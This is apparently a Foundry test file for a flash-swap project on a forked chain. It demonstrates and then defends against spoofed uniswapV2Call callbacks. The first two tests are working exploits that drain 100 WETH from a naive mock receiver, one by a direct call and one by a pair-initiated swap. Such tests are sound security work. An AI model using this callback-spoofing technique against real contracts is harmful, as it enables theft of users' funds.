// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ForkBase} from "test/base/ForkBase.sol";
import {NaiveFlashReceiver} from "./mocks/NaiveFlashReceiver.sol";
import {FlashSwap} from "src/FlashSwap.sol";
import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "openzeppelin-contracts/token/ERC20/utils/SafeERC20.sol";

contract UnsafeFlashCallbackTest is ForkBase {
    using SafeERC20 for IERC20;

    NaiveFlashReceiver internal naiveReceiver;
    FlashSwap internal secureFlashSwap;
    address internal usdcWethPair;

    address internal sushiRouterAddr = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    function setUp() public override {
        super.setUp();
        usdcWethPair = factory.getPair(address(usdc), address(weth));

        naiveReceiver = new NaiveFlashReceiver();
        secureFlashSwap = new FlashSwap(address(factory), sushiRouterAddr);

        // Fund naiveReceiver with 100 WETH treasury
        deal(address(weth), address(naiveReceiver), 100 ether);
    }

    /// @notice Variant A: Attacker directly calls callback on NaiveFlashReceiver with no pair involved
    function test_Attack03_VariantA_NaiveDirectCallDrainsTreasury() public {
        uint256 attackerWethBefore = weth.balanceOf(attacker);
        assertEq(weth.balanceOf(address(naiveReceiver)), 100 ether, "Naive receiver funded with 100 WETH");

        // Attacker directly calls callback with spoofed payload
        bytes memory attackData = abi.encode(address(weth), attacker, 100 ether);

        vm.prank(attacker);
        naiveReceiver.uniswapV2Call(address(0), 0, 0, attackData);

        // Assert treasury is completely drained
        assertEq(weth.balanceOf(address(naiveReceiver)), 0, "Treasury should be drained to 0");
        assertEq(weth.balanceOf(attacker) - attackerWethBefore, 100 ether, "Attacker stole 100 WETH");
    }

    /// @notice Variant B: Attacker initiates real pair flash swap targeting NaiveFlashReceiver
    function test_Attack03_VariantB_NaivePairInitiatedDrain() public {
        assertEq(weth.balanceOf(address(naiveReceiver)), 100 ether, "Naive receiver funded with 100 WETH");

        // Attacker initiates swap on legitimate V2 pair, directing callback to naiveReceiver
        bytes memory attackData = abi.encode(address(weth), attacker, 100 ether);

        address token0 = IUniswapV2Pair(usdcWethPair).token0();
        uint256 amount0Out = token0 == address(weth) ? 1 ether : 0;
        uint256 amount1Out = token0 == address(weth) ? 0 : 1 ether;

        vm.startPrank(attacker);
        // Pre-fund the pair with the required fee repayment so swap k-check passes
        uint256 fee = (uint256(1 ether) * 1000) / 997 + 1;
        deal(address(weth), attacker, fee);
        weth.safeTransfer(usdcWethPair, fee);

        IUniswapV2Pair(usdcWethPair).swap(amount0Out, amount1Out, address(naiveReceiver), attackData);
        vm.stopPrank();

        // Assert treasury was drained by 100 WETH
        assertEq(weth.balanceOf(address(naiveReceiver)), 1 ether, "Treasury drained of all 100 initial WETH");
        assertGe(weth.balanceOf(attacker), 98 ether, "Attacker retains net profit after repayment");
    }

    /// @notice Defense Variant A: Direct call to secure FlashSwap is rejected
    function test_Attack03_Defense_DirectCallRevertsUnauthorizedCaller() public {
        bytes memory data = abi.encode(address(weth), address(usdc), 1 ether, 2000 * 1e6, 0, attacker);

        vm.prank(attacker);
        vm.expectRevert(FlashSwap.UnauthorizedCaller.selector);
        secureFlashSwap.uniswapV2Call(attacker, 0, 0, data);
    }

    /// @notice Defense Variant B: Pair swap initiated by attacker targeting secure FlashSwap is rejected
    function test_Attack03_Defense_HostileInitiatorRevertsUnauthorizedCaller() public {
        bytes memory data = abi.encode(address(weth), address(usdc), 1 ether, 2000 * 1e6, 0, attacker);

        address token0 = IUniswapV2Pair(usdcWethPair).token0();
        uint256 amount0Out = token0 == address(weth) ? 1 ether : 0;
        uint256 amount1Out = token0 == address(weth) ? 0 : 1 ether;

        // Pair calls secureFlashSwap.uniswapV2Call, but _activePair is 0 and sender != this
        vm.prank(attacker);
        vm.expectRevert(FlashSwap.UnauthorizedCaller.selector);
        IUniswapV2Pair(usdcWethPair).swap(amount0Out, amount1Out, address(secureFlashSwap), data);
    }
}
